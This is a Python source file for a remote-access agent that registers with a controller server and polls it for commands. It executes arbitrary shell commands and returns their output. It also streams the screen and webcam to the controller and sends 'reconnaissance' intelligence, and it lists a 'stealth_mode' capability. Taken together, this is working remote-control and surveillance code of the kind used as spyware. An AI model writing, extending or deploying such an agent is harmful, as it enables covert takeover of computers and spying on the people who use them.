#!/usr/bin/env python3
"""
Enhanced Python Agent with Comprehensive Improvements
- Fixed streaming issues
- Better error handling
- Security enhancements
- Performance optimizations
"""

import sys
import os
import time
import threading
import logging
from typing import Optional, Dict, Any, List

# Add current directory to path for imports
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Import our enhancement modules
try:
    from streaming_fixes import StreamManager, ImprovedScreenStreamer, ImprovedCameraStreamer
    STREAMING_FIXES_AVAILABLE = True
except ImportError:
    STREAMING_FIXES_AVAILABLE = False
    print("Warning: Streaming fixes module not available, using fallback")

try:
    from security_improvements import SecurityEnhancements
    SECURITY_AVAILABLE = True
except ImportError:
    SECURITY_AVAILABLE = False
    print("Warning: Security enhancements not available")

# Import original modules
import requests
import json
import socket
import uuid
import subprocess
import mss
import numpy as np
import cv2
import platform

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class EnhancedAgent:
    """Enhanced agent with all improvements integrated"""
    
    def __init__(self, server_url: str = "http://localhost:8080"):
        self.server_url = server_url
        self.agent_id = self._generate_agent_id()
        self.running = False
        
        # Enhanced components
        self.stream_manager: Optional[StreamManager] = None
        self.security: Optional[SecurityEnhancements] = None
        
        # Legacy support
        self.streaming_enabled = False
        self.camera_streaming_enabled = False
        
        # Initialize enhanced features
        self._initialize_enhancements()
        
        logger.info(f"Enhanced agent initialized with ID: {self.agent_id}")
    
    def _generate_agent_id(self) -> str:
        """Generate unique agent ID"""
        try:
            # Try to read existing ID
            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
            if os.path.exists(id_file):
                with open(id_file, 'r') as f:
                    return f.read().strip()
        except:
            pass
        
        # Generate new ID
        agent_id = str(uuid.uuid4())
        
        try:
            # Save ID for persistence
            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
            with open(id_file, 'w') as f:
                f.write(agent_id)
        except:
            pass
        
        return agent_id
    
    def _initialize_enhancements(self):
        """Initialize enhanced features"""
        try:
            # Initialize streaming manager
            if STREAMING_FIXES_AVAILABLE:
                self.stream_manager = StreamManager(self.server_url, self.agent_id)
                logger.info("Enhanced streaming manager initialized")
            
            # Initialize security features
            if SECURITY_AVAILABLE:
                self.security = SecurityEnhancements()
                token = self.security.initialize_security(self.agent_id)
                logger.info(f"Security features initialized with token: {token[:20]}...")
            
        except Exception as e:
            logger.error(f"Error initializing enhancements: {e}")
    
    def start(self):
        """Start the enhanced agent"""
        logger.info("Starting enhanced agent...")
        self.running = True
        
        # Register with controller
        self._register_with_controller()
        
        # Start main loop
        self._main_loop()
    
    def stop(self):
        """Stop the enhanced agent"""
        logger.info("Stopping enhanced agent...")
        self.running = False
        
        # Stop all streams
        self.stop_all_streams()
        
        # Security cleanup
        if self.security:
            self.security.cleanup_and_exit()
    
    def _register_with_controller(self):
        """Register agent with controller"""
        try:
            registration_data = {
                "agent_id": self.agent_id,
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "capabilities": self._get_capabilities(),
                "timestamp": time.time()
            }
            
            response = requests.post(
                f"{self.server_url}/register",
                json=registration_data,
                timeout=10
            )
            
            if response.status_code == 200:
                logger.info("Successfully registered with controller")
            else:
                logger.warning(f"Registration failed: {response.status_code}")
                
        except Exception as e:
            logger.error(f"Registration error: {e}")
    
    def _get_capabilities(self) -> List[str]:
        """Get agent capabilities"""
        capabilities = ["basic_commands", "system_info"]
        
        if STREAMING_FIXES_AVAILABLE:
            capabilities.extend(["enhanced_screen_stream", "enhanced_camera_stream"])
        else:
            capabilities.extend(["screen_stream", "camera_stream"])
        
        if SECURITY_AVAILABLE:
            capabilities.extend(["security_features", "reconnaissance", "stealth_mode"])
        
        return capabilities
    
    def _main_loop(self):
        """Main agent loop"""
        last_checkin = 0
        checkin_interval = 30  # Check in every 30 seconds
        
        while self.running:
            try:
                current_time = time.time()
                
                # Periodic check-in
                if current_time - last_checkin > checkin_interval:
                    self._checkin_with_controller()
                    last_checkin = current_time
                
                # Process commands
                self._process_commands()
                
                # Small sleep to prevent busy waiting
                time.sleep(1)
                
            except KeyboardInterrupt:
                logger.info("Received interrupt signal")
                break
            except Exception as e:
                logger.error(f"Error in main loop: {e}")
                time.sleep(5)  # Wait before retrying
    
    def _checkin_with_controller(self):
        """Check in with controller"""
        try:
            checkin_data = {
                "agent_id": self.agent_id,
                "status": "active",
                "timestamp": time.time(),
                "streaming_status": self._get_streaming_status()
            }
            
            response = requests.post(
                f"{self.server_url}/checkin",
                json=checkin_data,
                timeout=5
            )
            
            if response.status_code != 200:
                logger.warning(f"Check-in failed: {response.status_code}")
                
        except Exception as e:
            logger.debug(f"Check-in error: {e}")  # Debug level since this is expected to fail sometimes
    
    def _process_commands(self):
        """Process pending commands from controller"""
        try:
            response = requests.get(
                f"{self.server_url}/commands/{self.agent_id}",
                timeout=5
            )
            
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    self._execute_command(command)
                    
        except Exception as e:
            logger.debug(f"Command processing error: {e}")
    
    def _execute_command(self, command: Dict[str, Any]):
        """Execute a command"""
        try:
            cmd_type = command.get("type")
            cmd_data = command.get("data", {})
            
            logger.info(f"Executing command: {cmd_type}")
            
            if cmd_type == "start-stream":
                self.start_screen_stream()
            elif cmd_type == "stop-stream":
                self.stop_screen_stream()
            elif cmd_type == "start-camera":
                self.start_camera_stream()
            elif cmd_type == "stop-camera":
                self.stop_camera_stream()
            elif cmd_type == "system-info":
                self._send_system_info()
            elif cmd_type == "execute":
                self._execute_system_command(cmd_data.get("command", ""))
            elif cmd_type == "reconnaissance" and SECURITY_AVAILABLE:
                self._perform_reconnaissance()
            else:
                logger.warning(f"Unknown command type: {cmd_type}")
                
        except Exception as e:
            logger.error(f"Command execution error: {e}")
    
    def start_screen_stream(self, fps: int = 30):
        """Start screen streaming"""
        if STREAMING_FIXES_AVAILABLE and self.stream_manager:
            success = self.stream_manager.start_screen_stream(fps)
            if success:
                logger.info("Enhanced screen streaming started")
                return True
        
        # Fallback to legacy streaming
        logger.info("Using legacy screen streaming")
        return self._legacy_start_screen_stream()
    
    def stop_screen_stream(self):
        """Stop screen streaming"""
        if STREAMING_FIXES_AVAILABLE and self.stream_manager:
            success = self.stream_manager.stop_screen_stream()
            if success:
                logger.info("Enhanced screen streaming stopped")
                return True
        
        # Fallback to legacy
        self.streaming_enabled = False
        logger.info("Legacy screen streaming stopped")
        return True
    
    def start_camera_stream(self, fps: int = 30):
        """Start camera streaming"""
        if STREAMING_FIXES_AVAILABLE and self.stream_manager:
            success = self.stream_manager.start_camera_stream(fps)
            if success:
                logger.info("Enhanced camera streaming started")
                return True
        
        # Fallback to legacy streaming
        logger.info("Using legacy camera streaming")
        return self._legacy_start_camera_stream()
    
    def stop_camera_stream(self):
        """Stop camera streaming"""
        if STREAMING_FIXES_AVAILABLE and self.stream_manager:
            success = self.stream_manager.stop_camera_stream()
            if success:
                logger.info("Enhanced camera streaming stopped")
                return True
        
        # Fallback to legacy
        self.camera_streaming_enabled = False
        logger.info("Legacy camera streaming stopped")
        return True
    
    def stop_all_streams(self):
        """Stop all active streams"""
        self.stop_screen_stream()
        self.stop_camera_stream()
        logger.info("All streams stopped")
    
    def _get_streaming_status(self) -> Dict[str, Any]:
        """Get current streaming status"""
        if STREAMING_FIXES_AVAILABLE and self.stream_manager:
            return self.stream_manager.get_status()
        
        # Legacy status
        return {
            "screen_streaming": self.streaming_enabled,
            "camera_streaming": self.camera_streaming_enabled,
            "screen_stats": None,
            "camera_stats": None
        }
    
    def _send_system_info(self):
        """Send system information to controller"""
        try:
            if SECURITY_AVAILABLE and self.security:
                # Use enhanced reconnaissance
                info = self.security.gather_intelligence()
            else:
                # Basic system info
                info = {
                    "hostname": socket.gethostname(),
                    "platform": platform.system(),
                    "architecture": platform.architecture(),
                    "processor": platform.processor(),
                    "timestamp": time.time()
                }
            
            response = requests.post(
                f"{self.server_url}/system-info/{self.agent_id}",
                json=info,
                timeout=10
            )
            
            if response.status_code == 200:
                logger.info("System info sent successfully")
            else:
                logger.warning(f"Failed to send system info: {response.status_code}")
                
        except Exception as e:
            logger.error(f"Error sending system info: {e}")
    
    def _execute_system_command(self, command: str):
        """Execute a system command"""
        try:
            if not command.strip():
                return
            
            logger.info(f"Executing system command: {command}")
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = {
                "command": command,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "timestamp": time.time()
            }
            
            # Send result back to controller
            response = requests.post(
                f"{self.server_url}/command-result/{self.agent_id}",
                json=output,
                timeout=10
            )
            
            if response.status_code == 200:
                logger.info("Command result sent successfully")
            else:
                logger.warning(f"Failed to send command result: {response.status_code}")
                
        except subprocess.TimeoutExpired:
            logger.error("Command execution timed out")
        except Exception as e:
            logger.error(f"Error executing command: {e}")
    
    def _perform_reconnaissance(self):
        """Perform system reconnaissance"""
        if not SECURITY_AVAILABLE or not self.security:
            logger.warning("Security features not available for reconnaissance")
            return
        
        try:
            logger.info("Performing reconnaissance...")
            intel = self.security.gather_intelligence()
            
            # Send encrypted intelligence to controller
            response = requests.post(
                f"{self.server_url}/intelligence/{self.agent_id}",
                json=intel,
                timeout=30
            )
            
            if response.status_code == 200:
                logger.info("Intelligence sent successfully")
            else:
                logger.warning(f"Failed to send intelligence: {response.status_code}")
                
        except Exception as e:
            logger.error(f"Reconnaissance error: {e}")
    
    def _legacy_start_screen_stream(self):
        """Legacy screen streaming implementation"""
        if self.streaming_enabled:
            return True
        
        self.streaming_enabled = True
        thread = threading.Thread(target=self._legacy_screen_stream_loop, daemon=True)
        thread.start()
        return True
    
    def _legacy_screen_stream_loop(self):
        """Legacy screen streaming loop"""
        url = f"{self.server_url}/stream/{self.agent_id}"
        headers = {'Content-Type': 'image/jpeg'}
        
        with mss.mss() as sct:
            while self.streaming_enabled:
                try:
                    # Capture screen
                    monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                    sct_img = sct.grab(monitor)
                    img = np.array(sct_img)
                    
                    # Convert color format
                    if img.shape[2] == 4:
                        img = cv2.cvtColor(img, cv2.COLOR_BGRA2RGB)
                    
                    # Resize if too large
                    height, width = img.shape[:2]
                    if width > 1280:
                        scale = 1280 / width
                        new_width = int(width * scale)
                        new_height = int(height * scale)
                        img = cv2.resize(img, (new_width, new_height))
                    
                    # Encode
                    img_bgr = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
                    _, buffer = cv2.imencode('.jpg', img_bgr, [cv2.IMWRITE_JPEG_QUALITY, 70])
                    
                    # Send
                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.1)
                    
                    time.sleep(1/15)  # 15 FPS
                    
                except Exception as e:
                    logger.error(f"Legacy streaming error: {e}")
                    time.sleep(1)
    
    def _legacy_start_camera_stream(self):
        """Legacy camera streaming implementation"""
        if self.camera_streaming_enabled:
            return True
        
        self.camera_streaming_enabled = True
        thread = threading.Thread(target=self._legacy_camera_stream_loop, daemon=True)
        thread.start()
        return True
    
    def _legacy_camera_stream_loop(self):
        """Legacy camera streaming loop"""
        url = f"{self.server_url}/camera/{self.agent_id}"
        headers = {'Content-Type': 'image/jpeg'}
        
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                logger.error("Cannot open camera")
                self.camera_streaming_enabled = False
                return
            
            while self.camera_streaming_enabled:
                try:
                    ret, frame = cap.read()
                    if not ret:
                        break
                    
                    # Encode
                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                    
                    # Send
                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
                    
                    time.sleep(1/15)  # 15 FPS
                    
                except Exception as e:
                    logger.error(f"Legacy camera error: {e}")
                    time.sleep(1)
            
            cap.release()
            
        except Exception as e:
            logger.error(f"Camera initialization error: {e}")
            self.camera_streaming_enabled = False

def main():
    """Main function"""
    print("🚀 Enhanced Python Agent")
    print("=" * 50)
    
    # Configuration
    server_url = os.getenv("CONTROLLER_URL", "http://localhost:8080")
    
    # Create and start agent
    agent = EnhancedAgent(server_url)
    
    try:
        agent.start()
    except KeyboardInterrupt:
        print("\n⏹️  Stopping agent...")
    except Exception as e:
        logger.error(f"Agent error: {e}")
    finally:
        agent.stop()
        print("✅ Agent stopped")

if __name__ == "__main__":
    main()